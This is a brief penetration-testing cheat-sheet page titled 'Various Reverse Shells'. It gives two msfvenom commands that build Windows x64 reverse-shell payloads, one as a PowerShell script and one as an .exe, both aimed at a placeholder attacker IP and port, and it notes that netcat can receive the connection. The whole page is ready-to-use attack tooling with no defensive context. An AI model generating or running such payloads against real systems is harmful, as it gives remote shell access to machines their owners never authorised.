# Various Reverse Shells

#### Classic Reverse Shell - Windows (netcat)

Non-staged payloads can be "catched" using netcat.

{% tabs %}
{% tab title="PowerShell" %}
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f psh -o shell.ps1`
{% endtab %}

{% tab title="CMD" %}
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o shell.exe`
{% endtab %}
{% endtabs %}

